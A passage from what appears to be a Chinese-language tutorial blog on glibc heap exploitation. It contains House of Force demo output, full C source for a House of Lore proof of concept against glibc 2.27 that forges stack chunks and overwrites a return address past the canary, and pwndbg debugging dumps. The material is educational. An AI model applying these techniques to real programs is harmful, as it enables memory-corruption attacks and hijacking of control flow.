<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the <span class="built_in">malloc</span> <span class="keyword">return</span> an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when <span class="built_in">malloc</span> asks <span class="keyword">for</span> more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at <span class="number">0x555555558060</span>.</span><br><span class="line">Its current value is: This is a <span class="built_in">string</span> that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let<span class="number">'</span>s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of <span class="number">256</span> bytes has been allocated at <span class="number">0x55555555b250</span>.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is <span class="number">280.</span></span><br><span class="line"></span><br><span class="line">Now let<span class="number">'</span>s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at <span class="number">0x55555555b360</span></span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the <span class="built_in">malloc</span> will never call mmap.</span><br><span class="line">Old size of top chunk <span class="number">0x20ca1</span></span><br><span class="line">New size of top chunk <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without <span class="built_in">malloc</span>() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at <span class="number">0x555555558060</span>, and the top chunk is at <span class="number">0x55555555b360</span>, so accounting <span class="keyword">for</span> the header size,</span><br><span class="line">we will <span class="built_in">malloc</span> <span class="number">0xffffffffffffcce0</span> bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: <span class="number">0x55555555b360</span></span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">100</span>) =&gt; <span class="number">0x555555558060</span>!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old <span class="built_in">string</span>: This is a <span class="built_in">string</span> that we want to overwrite.</span><br><span class="line">... doing <span class="built_in">strcpy</span> overwrite with <span class="string">"YEAH!!!"</span>...</span><br><span class="line">... new <span class="built_in">string</span>: YEAH!!!</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-lore-small-bin-1"><a href="#house-of-lore-small-bin-1" class="headerlink" title="house_of_lore(small bin)"></a>house_of_lore(small bin)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>{ <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); }</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating dummy chunks for using up tcache later\n"</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake free-list on the stack\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) {</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  }</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake free-list at %p\n"</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "</span></span><br><span class="line">          <span class="string">"introduced by smallbin-to-tcache mechanism\n"</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing dummy chunk\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now take all dummies chunk in tcache out\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(0x100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p> 此攻击手法没有在2.23那里调试过，这里调试一下。首先malloc 8个0x100大小的chunk，其中第一个会成为利用的对象，2-8会成为放入tcache中的对象。</p>
<p>并在栈上创建了一个指针数组fake_freelist，还创建了两个栈上数组一个是0x20一个是0x18<code>stack_buffer_1 stack_buffer_2</code>，将fake_freelist伪造成每0x20就链接到下一个地址，最后0x80不做操作，并将stack_buffer这两个变量进行一些赋值。具体如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x7fffffffdb30</span></span><br><span class="line"><span class="number">0x7fffffffdb30</span>:	<span class="number">0x00007ffff7ffe738</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdb40</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00007fffffffdb50</span></span><br><span class="line"><span class="number">0x7fffffffdb50</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000006562b026</span></span><br><span class="line"><span class="number">0x7fffffffdb60</span>:	<span class="number">0x00007ffff7ffea98</span>	<span class="number">0x00007fffffffdb70</span></span><br><span class="line"><span class="number">0x7fffffffdb70</span>:	<span class="number">0x00007fffffffdce0</span>	<span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdb80</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdb90</span></span><br><span class="line"><span class="number">0x7fffffffdb90</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdce0</span></span><br><span class="line"><span class="number">0x7fffffffdba0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdbb0</span></span><br><span class="line"><span class="number">0x7fffffffdbb0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdbc0</span>:	<span class="number">0x00007ffff7b97787</span>	<span class="number">0x00007fffffffdbd0</span></span><br><span class="line"><span class="number">0x7fffffffdbd0</span>:	<span class="number">0x00007fffffffdc00</span>	<span class="number">0x00007fffffffdc10</span></span><br><span class="line"><span class="number">0x7fffffffdbe0</span>:	<span class="number">0x00007ffff7ffea98</span>	<span class="number">0x00007fffffffdbf0</span></span><br><span class="line"><span class="number">0x7fffffffdbf0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdc00</span>:	<span class="number">0x00000000ffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x7fffffffdc10</span></span><br><span class="line"><span class="number">0x7fffffffdc10</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdc20</span>:	<span class="number">0x00007fffffffdc30</span>	<span class="number">0x00007fffffffdb30</span></span><br><span class="line"><span class="number">0x7fffffffdc30</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdc40</span>:	<span class="number">0x000055555555b250</span>	<span class="number">0x00007fffffffdc10</span></span><br><span class="line"></span><br><span class="line">stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line">stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br></pre></td></tr></tbody></table></figure>

<p>下面等会说一下为什么stack_buffer这样子构造。接下来分配0x10000大小的堆块这个是为了防止与top_chunk合并。将2-8入tcache，这个victim就可以直接进入unsortedbin。malloc(1200)这个堆块之后victim就会进入smallbin中，接下来假设有一个漏洞可以改victim这个堆块的bk为stack_buffer_1</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x55555555b9d0</span> —▸ <span class="number">0x55555555b8c0</span> —▸ <span class="number">0x55555555b7b0</span> —▸ <span class="number">0x55555555b6a0</span> —▸ <span class="number">0x55555555b590</span> —▸ <span class="number">0x55555555b480</span> —▸ <span class="number">0x55555555b370</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x110</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfda0</span> (main_arena+<span class="number">352</span>) ◂— <span class="number">0x55555555b250</span></span><br><span class="line">BK: <span class="number">0x55555555b250</span> —▸ <span class="number">0x7fffffffdc30</span> —▸ <span class="number">0x7fffffffdc10</span> —▸ <span class="number">0x7fffffffdb30</span> —▸ <span class="number">0x7fffffffdb50</span> ◂— ...</span><br></pre></td></tr></tbody></table></figure>

<p>现在将tcache清空，做一个和fastbin_reverse_into_tcache很相似的操作为的就是将bk这里的链表逆向链入tcache bins也就是malloc(0x100)。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffdbc0</span> —▸ <span class="number">0x7fffffffdba0</span> —▸ <span class="number">0x7fffffffdb80</span> —▸ <span class="number">0x7fffffffdb60</span> —▸ <span class="number">0x7fffffffdb40</span> —▸ <span class="number">0x7fffffffdc20</span> —▸ <span class="number">0x7fffffffdc40</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x110</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfda0</span> (main_arena+<span class="number">352</span>) ◂— <span class="number">0x55555555b250</span></span><br><span class="line">BK: <span class="number">0x7fffffffdbd0</span> —▸ <span class="number">0x7fffffffdbf0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p>如上，栈地址就进入了tcachebins中，此时申请0x100的时候就会申请到栈上。现在说一下为什么 stack_buffer需要这样构造？</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)){</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br></pre></td></tr></tbody></table></figure>

<p>看这个源码会有一个if<code>bck-&gt;fd != victim</code>对这个进行判断，因为只有绕过这个if，才可以malloc成功。接下来就是修改栈上的返回地址为target_function，最后会跳到target_function</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Lore</span><br><span class="line">This is a revisited version that bypass also the hardening check introduced by glibc <span class="built_in">malloc</span></span><br><span class="line">This is tested against Ubuntu <span class="number">18.04</span><span class="number">.5</span> - <span class="number">64b</span>it - glibc<span class="number">-2.27</span></span><br><span class="line"></span><br><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at <span class="number">0x55555555b260</span></span><br><span class="line">Allocating dummy chunks <span class="keyword">for</span> using up tcache later</span><br><span class="line">stack_buffer_1 at <span class="number">0x7fffffffdce0</span></span><br><span class="line">stack_buffer_2 at <span class="number">0x7fffffffdcc0</span></span><br><span class="line">Create a fake <span class="built_in">free</span>-<span class="built_in">list</span> on the <span class="built_in">stack</span></span><br><span class="line">fake <span class="built_in">free</span>-<span class="built_in">list</span> at <span class="number">0x7fffffffdbe0</span></span><br><span class="line">Create a fake chunk on the <span class="built_in">stack</span></span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last <span 